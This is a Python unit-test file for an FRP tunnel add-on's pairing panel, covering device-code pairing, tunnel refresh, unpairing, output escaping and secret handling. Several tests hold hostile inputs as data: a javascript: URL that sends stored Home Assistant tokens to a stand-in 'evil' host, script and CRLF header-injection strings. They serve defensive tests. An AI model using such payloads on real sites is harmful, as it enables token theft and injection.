"""Unit tests for the pairing panel flows in frp-mgr/app.py.

Needs the panel's dependencies (Starlette, Jinja2, python-multipart - as
installed in the add-on image's virtualenv, or `pip install --require-hashes
-r frp-tunnel/requirements.txt`); skipped otherwise. Set
FRP_TESTS_REQUIRE_PANEL=1 (or the older FRP_TESTS_REQUIRE_FASTAPI=1) to turn
the skip into a failure, as CI does. Backend calls and s6 are mocked. Run
inside the built image against the installed panel code, e.g.:

    docker run --rm -v "$PWD/frp-tunnel/tests:/tests:ro" \
        -e FRP_MGR_DIR=/usr/lib/frp-mgr -e FRP_TESTS_REQUIRE_PANEL=1 \
        --entrypoint python3 frp-tunnel-test -m unittest discover -s /tests/unit -v
"""
from __future__ import annotations

import asyncio
import http.server
import json
import os
import random
import re
import sys
import tempfile
import threading
import unittest
from pathlib import Path
from unittest import mock
from urllib.parse import urlencode

FRP_MGR = Path(
    os.environ.get("FRP_MGR_DIR")
    or Path(__file__).resolve().parents[2] / "rootfs" / "usr" / "lib" / "frp-mgr"
)
sys.path.insert(0, str(FRP_MGR))

try:
    import jinja2  # noqa: F401
    import python_multipart  # noqa: F401
    import starlette
    from starlette.requests import Request
except ImportError:  # pragma: no cover - host without the panel dependencies
    if "1" in (os.environ.get("FRP_TESTS_REQUIRE_PANEL"), os.environ.get("FRP_TESTS_REQUIRE_FASTAPI")):
        raise
    starlette = None

from tls_fixtures import CA1, CA2, EXPIRED_CA, V1_ROOT  # noqa: E402

TOKEN = "c" * 64
DEVICE_TOKEN = "DEVICE-TOKEN-SECRET-0123456789"
DEVICE_CODE = "0123456789abcdef" * 4
SAME_ORIGIN = [("sec-fetch-site", "same-origin")]
#: The Supervisor's ingress proxy - the only client allowed by default.
INGRESS = ("172.30.32.2", 50123)


def make_request(headers=()) -> "Request":
    raw = [(k.lower().encode("latin-1"), v.encode("latin-1")) for k, v in headers]
    return Request({"type": "http", "method": "POST", "path": "/", "headers": raw, "query_string": b""})


def get_request(query: bytes = b"") -> "Request":
    return Request({"type": "http", "method": "GET", "path": "/", "headers": [], "query_string": query})


def device_code_response(**extra):
    body = {
        "device_code": DEVICE_CODE,
        "user_code": "ABCD-EF23",
        "verification_uri": "https://app.test/activate",
        "verification_uri_complete": "https://app.test/activate?code=ABCD-EF23",
        "interval": 5,
        "expires_in": 600,
    }
    body.update(extra)
    return body


def asgi_call(app, method, path, headers=(), client=INGRESS, body=b"", host="panel.test"):
    """Drive the ASGI app like uvicorn would; returns (status, headers, body)."""
    sent = []
    raw_headers = [(k.lower().encode("latin-1"), v.encode("latin-1")) for k, v in headers]
    if host is not None and not any(k == b"host" for k, _ in raw_headers):
        raw_headers.append((b"host", host.encode("latin-1")))
    scope = {
        "type": "http", "asgi": {"version": "3.0"}, "http_version": "1.1", "method": method,
        "scheme": "http", "path": path, "raw_path": path.encode(), "query_string": b"",
        "root_path": "", "headers": raw_headers, "client": client, "server": ("127.0.0.1", 8099),
    }
    messages = [{"type": "http.request", "body": body, "more_body": False}]

    async def receive():
        if messages:
            return messages.pop(0)
        # The client stays connected until the response is complete (a file
        # response listens for a disconnect while it streams and would stop).
        await asyncio.Event().wait()

    async def send(message):
        sent.append(message)

    asyncio.run(app(scope, receive, send))
    start = next(m for m in sent if m["type"] == "http.response.start")
    payload = b"".join(m.get("body", b"") for m in sent if m["type"] == "http.response.body")
    return start["status"], {k.decode().lower(): v.decode() for k, v in start["headers"]}, payload


@unittest.skipIf(starlette is None, "panel dependencies not installed (run inside the add-on image)")
class PanelFlowTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls._env = mock.patch.dict(os.environ, {"FRP_DATA_DIR": tempfile.mkdtemp()})
        cls._env.start()
        import app  # noqa: PLC0415 - import after FRP_DATA_DIR is set
        import config as cfg  # noqa: PLC0415

        cls.app = app
        cls.cfg = cfg
        cls.real_http_json = staticmethod(app._http_json)
        import frpclog  # noqa: PLC0415

        cls.frpclog = frpclog

    @classmethod
    def tearDownClass(cls):
        cls._env.stop()

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.paths = self.cfg.Paths(Path(self._tmp.name))
        self.backend = {}  # (method, path) -> (status, body) or exception
        self.calls = []
        patches = [
            mock.patch.object(self.app, "PATHS", self.paths),
            mock.patch.object(self.app, "OPTIONS", {}),
            mock.patch.object(self.app, "APP_BASE", "https://app.test"),
            mock.patch.object(self.app, "_http_json", side_effect=self._fake_http),
            mock.patch.object(self.app, "OPTION_ERRORS", {}),
            mock.patch.object(self.app, "_restart_frpc"),
            mock.patch.object(self.app, "_stop_frpc", return_value=True),
            mock.patch.object(self.app, "_start_frpc_service"),
            mock.patch.object(self.app, "_frpc_status", return_value="running"),
            mock.patch.object(self.app, "FRPC_STATUS", self.paths.data_dir / "run" / "frpc-status.json"),
            mock.patch.object(self.app, "ALLOWED_CLIENT_NETS",
                              self.app._parse_allowed_clients(self.app.DEFAULT_ALLOWED_INGRESS_IPS)),
            mock.patch.dict(self.app._AUTO_REFRESH_STATUS, clear=True),
            mock.patch.dict(self.app._HA_PORT_CACHE, {"port": None, "expires": 0.0}),
            mock.patch.dict(os.environ),
        ]
        for p in patches:
            p.start()
            self.addCleanup(p.stop)
        os.environ.pop("SUPERVISOR_TOKEN", None)  # outside Supervisor (restored by patch.dict)
        self.addCleanup(self._tmp.cleanup)

    def _fake_http(self, method, url, body=None, bearer=None, timeout=15):
        path = url.replace("https://app.test", "")
        self.calls.append((method, path, body, bearer))
        answer = self.backend[(method, path)]
        if isinstance(answer, Exception):
            raise answer
        return answer

    def _tunnel(self, **extra):
        body = {"subdomain": "home", "token": TOKEN, "server_addr": "linumiq.net",
                "server_port": 7001, "domain_base": "dev.linumiq.net"}
        body.update(extra)
        return {k: v for k, v in body.items() if v is not ...}

    def _tunnel_v22(self, **extra):
        return self._tunnel(**dict({"server_name": "frps.linumiq.net", "server_ca_pem": CA1,
                                    "account_email_masked": "g***@linumiq.com"}, **extra))

    def _start_pairing(self, **extra):
        self.cfg.write_json(self.paths.pairing, dict({"device_code": DEVICE_CODE, "user_code": "ABCD-EFGH",
                                                      "interval": 5}, **extra))

    def _state(self):
        return json.loads(self.paths.state.read_text())

    def _frpc_log(self, state="connected", login_failures=0, network_failures=0, last_error="",
                  fingerprint=None):
        """Write the frpc log watcher's status for the current frpc.toml."""
        status = {
            "version": self.frpclog.STATUS_VERSION, "pid": 1, "started_at": 1.0, "updated_at": 2.0,
            "fingerprint": fingerprint or self.cfg.config_fingerprint(self.paths),
            "state": state, "logged_in_at": 1_800_000_000.0 if state == "connected" else None,
            "login_failures": login_failures, "network_failures": network_failures,
            "last_error": last_error, "last_error_kind": "", "last_error_at": None,
        }
        self.app.FRPC_STATUS.parent.mkdir(parents=True, exist_ok=True)
        self.app.FRPC_STATUS.write_text(json.dumps(status))

    # -- pairing -----------------------------------------------------------

    def test_pair_start_stores_validated_values(self):
        self.backend[("POST", "/api/device/code")] = (200, device_code_response(extra="<x>"))
        resp = self.app.pair_start(make_request())
        self.assertEqual(resp.headers["location"], "/")
        stored = json.loads(self.paths.pairing.read_text())
        self.assertEqual(stored["user_code"], "ABCD-EF23")
        self.assertEqual(stored["interval"], 5)
        self.assertNotIn("extra", stored)
        body = self.app.index(get_request()).body.decode()
        self.assertIn('href="https://app.test/activate?code=ABCD-EF23"', body)
        self.assertIn("var interval = 5 * 1000;", body)

    def test_pair_start_rejects_unsafe_responses(self):
        cases = [
            {"verification_uri_complete": "javascript:fetch('//evil/'+localStorage.hassTokens)"},
            {"verification_uri_complete": "https://evil.example/activate"},
            {"verification_uri_complete": "http://app.test/activate"},  # app_base is https
            {"verification_uri": "data:text/html,<script>alert(1)</script>"},
            {"interval": "1;fetch(String.fromCharCode(47,47)+location.host)//"},
            {"interval": 0},
            {"interval": 61},
            {"expires_in": "600"},
            {"user_code": "AB<i>CD"},
            {"user_code": None},
            {"device_code": 'x"' * 10},
        ]
        for extra in cases:
            self.backend[("POST", "/api/device/code")] = (200, device_code_response(**extra))
            with self.subTest(extra=extra):
                with self.assertRaises(self.app.FlashError) as ctx:
                    self.app.pair_start(make_request())
                self.assertIn("Pairing rejected", ctx.exception.message)
                self.assertFalse(self.paths.pairing.exists())
                for value in extra.values():
                    if isinstance(value, str) and len(value) > 4:
                        self.assertNotIn(value, ctx.exception.message)

    def test_pairing_code_is_never_put_into_a_url_or_the_log(self):
        self.backend[("POST", "/api/device/code")] = (200, device_code_response())
        with self.assertLogs("frp-mgr", "INFO") as logs:
            resp = self.app.pair_start(make_request([("X-Ingress-Path", "/api/hassio_ingress/abc")]))
        self.assertEqual(resp.headers["location"], "/api/hassio_ingress/abc/")
        self.assertNotIn("ABCD", " ".join(logs.output))
        self.assertTrue(any("Pairing started" in line for line in logs.output))
        # ... it is shown in the page body only, with the anti-phishing hint.
        body = self.app.index(get_request()).body.decode()
        self.assertIn("ABCD-EF23", body)
        self.assertIn("Never approve a code that", body)

    def test_stored_unsafe_pairing_is_never_rendered(self):
        # A pairing file written by an older version / tampered with.
        self.cfg.write_json(self.paths.pairing, {
            "device_code": "dc", "user_code": "AB<i>CD",
            "verification_uri_complete": "javascript:fetch('//evil/'+localStorage.hassTokens)",
            "interval": "1;fetch(String.fromCharCode(47,47)+location.host)//"})
        body = self.app.index(get_request()).body.decode()
        self.assertNotIn("javascript:", body)
        self.assertNotIn("fromCharCode", body)
        self.assertNotIn("AB<i>CD", body)
        self.assertIn("Start Pairing", body)
        self.assertEqual(self.app.pair_poll()["status"], "error")  # no pairing in progress

    def test_templates_never_disable_autoescaping(self):
        env = self.app.templates.env
        autoescape = env.autoescape(None) if callable(env.autoescape) else env.autoescape
        self.assertTrue(autoescape)
        for template in (FRP_MGR / "templates").glob("*.html"):
            text = template.read_text()
            self.assertIsNone(re.search(r"\|\s*safe\b", text), template)
            self.assertNotIn("autoescape false", text)
            self.assertNotIn("Markup", text)
            # Values embedded in JavaScript go through |tojson.
            for expr in re.findall(r"<script>(.*?)</script>", text, re.S):
                for jinja in re.findall(r"\{\{(.*?)\}\}", expr):
                    self.assertIn("tojson", jinja, jinja)

    def test_poll_pending_and_slow_down(self):
        self._start_pairing()
        self.backend[("POST", "/api/device/token")] = (400, {"error": "authorization_pending"})
        self.assertEqual(self.app.pair_poll()["status"], "pending")
        self.backend[("POST", "/api/device/token")] = (429, {"error": "slow_down"})
        self.assertEqual(self.app.pair_poll()["status"], "slow_down")
        self.backend[("POST", "/api/device/token")] = self.app.BackendUnavailable("down")
        self.assertEqual(self.app.pair_poll()["status"], "retry")
        self.assertTrue(self.paths.pairing.exists())

    def test_poll_expired_clears_pairing(self):
        self._start_pairing()
        self.backend[("POST", "/api/device/token")] = (400, {"error": "expired_token"})
        self.assertEqual(self.app.pair_poll()["status"], "expired")
        self.assertFalse(self.paths.pairing.exists())

    def test_poll_success_persists_server_values_and_renders(self):
        self._start_pairing()
        self.backend[("POST", "/api/device/token")] = (200, {"device_token": DEVICE_TOKEN})
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel())
        result = self.app.pair_poll()
        self.assertEqual(result, {"status": "paired", "subdomain": "home"})
        state = self._state()
        self.assertEqual(state["device_token"], DEVICE_TOKEN)
        self.assertEqual(state["token"], TOKEN)
        self.assertEqual(state["domain_base"], "dev.linumiq.net")
        self.assertEqual(state["server_port"], 7001)
        toml = self.paths.frpc_toml.read_text()
        self.assertIn('customDomains = ["home.dev.linumiq.net"]', toml)
        self.assertIn("serverPort = 7001", toml)
        self.assertIn("transport.tls.enable = true", toml)
        self.app._restart_frpc.assert_called_once()
        self.assertFalse(self.paths.pairing.exists())
        # The device token is used as bearer for the tunnel fetch.
        self.assertEqual(self.calls[-1][3], DEVICE_TOKEN)

    def test_poll_keeps_device_token_when_tunnel_fetch_fails(self):
        self._start_pairing()
        self.backend[("POST", "/api/device/token")] = (200, {"device_token": DEVICE_TOKEN})
        self.backend[("GET", "/api/device/tunnel")] = self.app.BackendUnavailable("down")
        self.assertEqual(self.app.pair_poll()["status"], "no_tunnel")
        self.assertEqual(self._state()["device_token"], DEVICE_TOKEN)
        self.assertFalse(self.paths.frpc_toml.exists())
        # "Refresh" recovers once the backend is back.
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel())
        resp = self.app.tunnel_refresh(make_request())
        self.assertEqual(resp.status_code, 303)
        self.assertIn("ok=", resp.headers["location"])
        self.assertTrue(self.paths.frpc_toml.exists())

    def test_poll_rejects_malformed_device_token(self):
        self._start_pairing()
        self.backend[("POST", "/api/device/token")] = (200, {"device_token": "bad token\r\nX-Evil: 1"})
        result = self.app.pair_poll()
        self.assertEqual(result["status"], "error")
        self.assertNotIn("X-Evil", json.dumps(result))
        self.assertFalse(self.paths.state.exists())

    def test_poll_no_tunnel(self):
        self._start_pairing()
        self.backend[("POST", "/api/device/token")] = (200, {"device_token": DEVICE_TOKEN})
        self.backend[("GET", "/api/device/tunnel")] = (404, {"error": "no_tunnel"})
        self.assertEqual(self.app.pair_poll()["status"], "no_tunnel")
        self.assertTrue(self.app._view_model()["approved_no_tunnel"])

    def test_poll_rejects_invalid_server_response(self):
        self._start_pairing()
        self.backend[("POST", "/api/device/token")] = (200, {"device_token": DEVICE_TOKEN})
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel(token='x" injected'))
        self.assertEqual(self.app.pair_poll()["status"], "error")
        self.assertFalse(self.paths.frpc_toml.exists())

    # -- refresh / change ----------------------------------------------------

    def _paired(self, **extra):
        state, _ = self.cfg.apply_tunnel_response({"device_token": DEVICE_TOKEN}, self._tunnel(**extra))
        self.cfg.write_json(self.paths.state, state)
        self.cfg.render_from_disk(self.paths)

    def test_refresh_unchanged_does_not_restart(self):
        self._paired()
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel())
        resp = self.app.tunnel_refresh(make_request())
        self.assertIn("up+to+date", resp.headers["location"])
        self.app._restart_frpc.assert_not_called()

    def test_refresh_picks_up_changed_server_values(self):
        self._paired()
        self.backend[("GET", "/api/device/tunnel")] = (
            200, self._tunnel(server_port=7000, domain_base="linumiq.net"))
        resp = self.app.tunnel_refresh(make_request())
        self.assertIn("updated", resp.headers["location"])
        self.app._restart_frpc.assert_called_once()
        toml = self.paths.frpc_toml.read_text()
        self.assertIn("serverPort = 7000", toml)
        self.assertIn('customDomains = ["home.linumiq.net"]', toml)

    def test_refresh_with_option_override(self):
        self._paired()
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel(server_port=7000))
        with mock.patch.object(self.app, "OPTIONS", self.cfg.parse_options({"server_port": 7001})):
            self.app.tunnel_refresh(make_request())
        self.assertIn("serverPort = 7001", self.paths.frpc_toml.read_text())
        self.assertEqual(self._state()["server_port"], 7000)  # server value still persisted

    def test_refresh_unauthorized(self):
        self._paired()
        self.backend[("GET", "/api/device/tunnel")] = (401, {"error": "unauthorized"})
        with self.assertRaises(self.app.FlashError) as ctx:
            self.app.tunnel_refresh(make_request())
        self.assertIn("pair again", ctx.exception.message)

    def test_subdomain_change_surfaces_server_reason_verbatim(self):
        self._paired()
        self.backend[("POST", "/api/device/tunnel")] = (400, {"error": "'myhome' is reserved"})
        with self.assertRaises(self.app.FlashError) as ctx:
            self.app.subdomain_change(make_request(), subdomain="myhome")
        self.assertIn("'myhome' is reserved", ctx.exception.message)

    def test_subdomain_change_success(self):
        self._paired()
        self.backend[("POST", "/api/device/tunnel")] = (200, self._tunnel(subdomain="newhome", token="d" * 64))
        resp = self.app.subdomain_change(make_request(), subdomain="NewHome")
        self.assertIn("newhome.dev.linumiq.net", resp.headers["location"])
        self.assertEqual(self.calls[-1][2], {"subdomain": "newhome"})
        self.assertIn("d" * 64, self.paths.frpc_toml.read_text())

    def test_reserved_and_invalid_subdomains_rejected_locally(self):
        for bad in ("studio", "localhost", "diun", "ab", "-abc", "a" * 33, "a_b"):
            with self.assertRaises(self.app.FlashError, msg=bad):
                self.app._validate_subdomain(bad)
        self.assertEqual(self.app._validate_subdomain(" My-Home "), "my-home")

    def test_unpair_removes_everything(self):
        self._paired(**self._tunnel_v22())
        self.assertTrue(self.paths.frps_ca.exists())
        self.backend[("DELETE", "/api/device/tunnel")] = (200, {"ok": True})
        resp = self.app.unpair(make_request())
        self.assertIn("ok=", resp.headers["location"])
        for path in (self.paths.state, self.paths.frpc_toml, self.paths.pairing, self.paths.frps_ca):
            self.assertFalse(path.exists())
        self.assertEqual(self.calls[-1][:2], ("DELETE", "/api/device/tunnel"))
        self.assertEqual(self.calls[-1][3], DEVICE_TOKEN)

    def test_unpair_order_state_then_stop_then_toml(self):
        self._paired()
        self.backend[("DELETE", "/api/device/tunnel")] = (200, {"ok": True})
        events = []

        def stop():
            # State is already gone (a concurrent render answers "not
            # paired"), frpc.toml is only removed once frpc is down.
            events.append(("stop", self.paths.state.exists(), self.paths.frpc_toml.exists()))
            return True

        def start():
            events.append(("start", self.paths.state.exists(), self.paths.frpc_toml.exists()))

        self.app._stop_frpc.side_effect = stop
        self.app._start_frpc_service.side_effect = start
        self.app.unpair(make_request())
        self.assertEqual(events, [("stop", False, True), ("start", False, False)])

    def test_unpair_reports_failed_revocation(self):
        for answer in ((500, {"error": "failed\r\nINFO: forged"}), self.app.BackendUnavailable("down")):
            self._paired()
            self.backend[("DELETE", "/api/device/tunnel")] = answer
            with self.subTest(answer=answer):
                resp = self.app.unpair(make_request())
                location = resp.headers["location"]
                self.assertIn("error=", location)
                self.assertNotIn("ok=", location)
                self.assertIn("unpaired+locally", location)
                self.assertNotIn("%0A", location)
                self.assertNotIn("%0D", location)
                for path in (self.paths.state, self.paths.frpc_toml, self.paths.pairing):
                    self.assertFalse(path.exists())

    def test_unpair_already_revoked_is_ok(self):
        self._paired()
        self.backend[("DELETE", "/api/device/tunnel")] = (401, {"error": "unauthorized"})
        self.assertIn("ok=", self.app.unpair(make_request()).headers["location"])

    # -- configuration problems -----------------------------------------------

    def test_invalid_app_base_option_is_shown_and_blocks_backend_calls(self):
        errors = {"app_base": "app_base='x' is invalid (expected an http(s) URL); it is ignored."}
        with mock.patch.object(self.app, "OPTION_ERRORS", errors):
            body = self.app.index(get_request()).body.decode()
            self.assertIn("Invalid add-on configuration", body)
            self.assertIn("app_base=&#39;x&#39; is invalid", body)
            self.assertEqual(self.app.api_status()["option_errors"], list(errors.values()))
            with self.assertRaises(self.app.FlashError) as ctx:
                self.app.pair_start(make_request())
            self.assertIn("Fix the add-on configuration", ctx.exception.message)
        self.assertEqual(self.calls, [])

    def test_stray_frpc_is_reported_when_unpaired(self):
        status = self.app.api_status()
        self.assertFalse(status["paired"])
        self.assertEqual(status["frpc_status"], "running")  # real status, not "stopped"
        self.assertIn("frpc is running although this device is not paired",
                      self.app.index(get_request()).body.decode())

    # -- backend text hygiene ------------------------------------------------

    def test_backend_error_text_is_single_line(self):
        self._paired()
        self.backend[("POST", "/api/device/tunnel")] = (400, {"error": "bad\r\nINFO: forged\u202e x" + "y" * 500})
        with self.assertRaises(self.app.FlashError) as ctx:
            self.app.subdomain_change(make_request(), subdomain="myhome")
        message = ctx.exception.message
        self.assertTrue(message.isprintable(), repr(message))
        self.assertLess(len(message), 300)

    def test_http_json_refuses_redirects_and_never_echoes_tokens(self):
        hits = []

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):  # noqa: N802
                hits.append((self.path, self.headers.get("Authorization")))
                if self.path.startswith("/big"):
                    self.send_response(500 if self.path == "/big-error" else 200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(b'{"error": "' + b"x" * (300 * 1024) + b'"}')
                    return
                if self.path.startswith("/redirect"):
                    self.send_response(302)
                    self.send_header("Location", f"http://127.0.0.1:{self.server.server_port}/landing")
                    self.end_headers()
                    return
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"ok": true}')

            def log_message(self, *args):
                pass

        server = http.server.HTTPServer(("127.0.0.1", 0), Handler)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)
        base = f"http://127.0.0.1:{server.server_port}"

        self.assertEqual(self.real_http_json("GET", f"{base}/plain", bearer=DEVICE_TOKEN), (200, {"ok": True}))
        with self.assertLogs("frp-mgr", "ERROR") as logs:
            with self.assertRaises(self.app.BackendUnavailable) as ctx:
                self.real_http_json("GET", f"{base}/redirect", bearer=DEVICE_TOKEN)
        self.assertIn("redirect", str(ctx.exception))
        self.assertEqual([path for path, _ in hits], ["/plain", "/redirect"])  # /landing never hit
        self.assertNotIn(DEVICE_TOKEN, " ".join(logs.output) + str(ctx.exception))

        # A malformed token is refused before urllib can echo it in an error.
        with self.assertLogs("frp-mgr", "ERROR") as logs:
            with self.assertRaises(self.app.BackendUnavailable) as ctx:
                self.real_http_json("GET", f"{base}/plain", bearer="SECRETDEVICETOKEN\n")
        self.assertNotIn("SECRETDEVICETOKEN", " ".join(logs.output) + str(ctx.exception))
        self.assertEqual(len(hits), 2)

        # Response bodies are limited (L-11): oversized = unusable; an
        # oversized error body is cut.
        with self.assertLogs("frp-mgr", "ERROR"):
            with self.assertRaises(self.app.BackendUnavailable) as ctx:
                self.real_http_json("GET", f"{base}/big", bearer=DEVICE_TOKEN)
        self.assertIn("oversized", str(ctx.exception))
        code, body = self.real_http_json("GET", f"{base}/big-error", bearer=DEVICE_TOKEN)
        self.assertEqual(code, 500)
        self.assertLessEqual(len(body), self.app.MAX_RESPONSE_BYTES)

    def test_http_json_maps_protocol_errors_to_backend_unavailable(self):
        import socket
        listener = socket.socket()
        listener.bind(("127.0.0.1", 0))
        listener.listen(1)
        self.addCleanup(listener.close)

        def garbage():
            conn, _ = listener.accept()
            conn.recv(4096)
            conn.sendall(b"NOT-HTTP\r\n\r\n")
            conn.close()

        threading.Thread(target=garbage, daemon=True).start()
        with self.assertLogs("frp-mgr", "ERROR"):
            with self.assertRaises(self.app.BackendUnavailable):
                self.real_http_json("GET", f"http://127.0.0.1:{listener.getsockname()[1]}/x",
                                    bearer=DEVICE_TOKEN)

    # -- UI ----------------------------------------------------------------

    def test_index_renders_every_state(self):
        def page():
            req = get_request(b"error=%3Cb%3Ex%3C%2Fb%3E")
            body = self.app.index(req).body.decode()
            self.assertNotIn(TOKEN, body)
            self.assertNotIn(DEVICE_TOKEN, body)
            self.assertNotIn("<b>x</b>", body)  # flash text is escaped
            return body

        self.assertIn("Start Pairing", page())
        self._start_pairing()
        self.assertIn("ABCD-EFGH", page())
        self.paths.pairing.unlink()
        self.cfg.write_json(self.paths.state, {"device_token": DEVICE_TOKEN})
        self.assertIn("Choose a Subdomain", page())
        self._paired()
        body = page()
        self.assertIn("https://home.dev.linumiq.net", body)
        self.assertIn("linumiq.net:7001", body)
        self.assertIn("Refresh tunnel config", body)

    # -- shared LinumIQ UI (shared/ui, copied by scripts/sync-shared.sh) ----

    def _pages(self):
        """The dashboard in every state: unpaired, pairing in progress (with
        the pairing link), approved without a tunnel, paired."""
        pages = {"unpaired": self.app.index(get_request()).body.decode()}
        self._start_pairing(verification_uri_complete="https://app.test/activate?code=ABCD-EFGH")
        pages["pairing"] = self.app.index(get_request()).body.decode()
        self.paths.pairing.unlink()
        self.cfg.write_json(self.paths.state, {"device_token": DEVICE_TOKEN})
        pages["approved_no_tunnel"] = self.app.index(get_request()).body.decode()
        self._paired()
        pages["paired"] = self.app.index(get_request()).body.decode()
        return pages

    def test_static_files_are_served_with_their_content_types(self):
        for path, content_type in (
            ("/static/shared/linumiq.css", "text/css"),
            ("/static/app.css", "text/css"),
            ("/static/brand/icon.svg", "image/svg+xml"),
            ("/static/shared/brand/linumiq-logo.png", "image/png"),
            ("/static/shared/fonts/roboto-latin.woff2", "font/woff2"),
            ("/static/shared/fonts/roboto-latin-ext.woff2", "font/woff2"),
            ("/static/shared/fonts/inter-latin.woff2", "font/woff2"),
            ("/static/shared/fonts/inter-latin-ext.woff2", "font/woff2"),
        ):
            with self.subTest(path=path):
                status, headers, body = asgi_call(self.app.app, "GET", path)
                self.assertEqual(status, 200)
                self.assertEqual(headers["content-type"].split(";")[0], content_type)
                self.assertGreater(len(body), 100)
                if content_type == "font/woff2":
                    self.assertEqual(body[:4], b"wOF2")

    def test_pages_use_the_shared_layout(self):
        pages = self._pages()
        for state, body in pages.items():
            with self.subTest(state=state):
                self.assertTrue(body.lstrip().startswith("<!doctype html>"), body[:80])
                self.assertIn('<meta name="color-scheme" content="light dark" />', body)
                self.assertIn("<title>FRP Tunnel - Pairing Panel</title>", body)
                # Shared stylesheet first, then the app's own.
                shared_css = body.index('<link rel="stylesheet" href="static/shared/linumiq.css" />')
                self.assertLess(shared_css, body.index('<link rel="stylesheet" href="static/app.css" />'))
                # Header: the app's mark (no emoji any more), name, subtitle.
                self.assertIn('class="app-header__mark"', body)
                self.assertIn('src="static/brand/icon.svg"', body)
                self.assertIn("<h1>FRP Tunnel</h1>", body)
                self.assertIn("reachable on the public internet.", body)
                self.assertNotIn("\U0001f517", body)
                # Footer: the LinumIQ logo linking to linumiq.com in a new tab.
                footer = body[body.index('<footer class="app-footer">'):]
                self.assertIn('href="https://linumiq.com"', footer)
                self.assertIn('target="_blank"', footer)
                self.assertIn('rel="noopener noreferrer"', footer)
                self.assertIn('src="static/shared/brand/linumiq-logo.png"', footer)
                self.assertIn('alt="LinumIQ"', footer)
        # The single call to action of the pairing flow is the orange button.
        self.assertIn('<button class="btn-cta" type="submit">Start Pairing</button>', pages["unpaired"])
        self.assertIn('class="btn-cta"', pages["pairing"])
        self.assertNotIn("btn-cta", pages["paired"] + pages["approved_no_tunnel"])

    def test_no_external_resources(self):
        """Nothing is loaded from another host (no Google Fonts, no CDN): every
        resource URL is relative; the only absolute URLs are the links to
        linumiq.com, the pairing page and the public URL."""
        allowed = {"https://linumiq.com", "https://app.test/activate?code=ABCD-EFGH",
                   "https://home.dev.linumiq.net"}
        for state, body in self._pages().items():
            with self.subTest(state=state):
                for url in re.findall(r'\b(?:href|src|srcset|action|poster|data)="([^"]*)"', body):
                    if re.match(r"[a-z][a-z0-9+.-]*:|//", url):
                        self.assertIn(url, allowed)
                self.assertNotRegex(body, r"url\(|@import")
                for tag in re.findall(r"<(?:link|script|img|source|iframe)\b[^>]*>", body):
                    for url in re.findall(r'\b(?:src|href)="([^"]*)"', tag):
                        self.assertRegex(url, r"^(?![a-z][a-z0-9+.-]*:|/)", tag)
                self.assertNotIn("fonts.googleapis", body)
                self.assertNotIn("gstatic", body)
        css_files = sorted((FRP_MGR / "static").rglob("*.css"))
        self.assertEqual([p.name for p in css_files], ["app.css", "linumiq.css"])
        for css in css_files:
            with self.subTest(css=css.name):
                text = css.read_text()
                self.assertNotRegex(text, r"https?:|@import|//[a-z]")
                for url in re.findall(r"url\(\s*['\"]?([^'\")]+)", text):
                    self.assertTrue((css.parent / url).is_file(), url)

    # -- status / security ---------------------------------------------------

    def test_status_never_contains_secrets(self):
        self._paired()
        status = self.app.api_status()
        dumped = json.dumps(status)
        self.assertNotIn(TOKEN, dumped)
        self.assertNotIn(DEVICE_TOKEN, dumped)
        self.assertTrue(status["paired"])
        self.assertEqual(status["public_url"], "https://home.dev.linumiq.net")
        self.assertEqual(status["sources"]["domain_base"], "server")
        self.assertTrue(status["tls"])

    def test_local_port_follows_home_assistant_port_from_the_supervisor(self):
        self._paired()
        self.assertEqual(self.app.api_status()["local_port"], 8123)  # no token: default, no request
        self.app._HA_PORT_CACHE.update(port=None, expires=0.0)
        with mock.patch.object(self.cfg, "supervisor_core_port", return_value=80) as lookup:
            status = self.app.api_status()
            self.assertEqual((status["local_host"], status["local_port"]), ("homeassistant", 80))
            self.assertEqual(status["sources"]["local_port"], "supervisor")
            body = self.app.index(get_request()).body.decode()
            self.assertIn("homeassistant:80", body)
            self.assertIn("reported by the Supervisor", body)
            self.app._render_and_restart()
            self.assertIn("localPort = 80", self.paths.frpc_toml.read_text().splitlines())
            self.assertEqual(lookup.call_count, 1)  # cached (the status page polls)
        # The API is unavailable: 8123, and the lookup is retried later.
        self.app._HA_PORT_CACHE.update(port=None, expires=0.0)
        with mock.patch.object(self.cfg, "supervisor_core_port", return_value=None) as lookup:
            status = self.app.api_status()
            self.assertEqual((status["local_port"], status["sources"]["local_port"]), (8123, "default"))
            self.assertNotIn("reported by the Supervisor", self.app.index(get_request()).body.decode())
            self.assertEqual(lookup.call_count, 1)
            self.assertLessEqual(self.app._HA_PORT_CACHE["expires"] - self.app.time.monotonic(),
                                 self.app.HA_PORT_RETRY)
        # An explicit local_port option wins and nothing is looked up.
        self.app._HA_PORT_CACHE.update(port=None, expires=0.0)
        with mock.patch.object(self.app, "OPTIONS", self.cfg.parse_options({"local_port": 8124})), \
                mock.patch.object(self.cfg, "supervisor_core_port", return_value=80) as lookup:
            status = self.app.api_status()
            self.assertEqual((status["local_port"], status["sources"]["local_port"]), (8124, "option"))
            lookup.assert_not_called()

    # -- server verification (H4) / account (M4) --------------------------------

    def test_pairing_with_v22_server_pins_the_ca(self):
        self._start_pairing()
        self.backend[("POST", "/api/device/token")] = (200, {"device_token": DEVICE_TOKEN})
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel_v22())
        self.assertEqual(self.app.pair_poll()["status"], "paired")
        self.assertEqual(self.paths.frps_ca.read_text(), CA1)
        toml = self.paths.frpc_toml.read_text()
        self.assertIn(f'transport.tls.trustedCaFile = "{self.paths.frps_ca}"', toml)
        self.assertIn('transport.tls.serverName = "frps.linumiq.net"', toml)
        status = self.app.api_status()
        # Pinned, but "verified" only once frpc has logged in with it (L-10).
        self.assertEqual((status["tls_mode"], status["tls_verified"], status["tls_login"]),
                         ("verified", False, "unknown"))
        self.assertEqual(status["server_name"], "frps.linumiq.net")
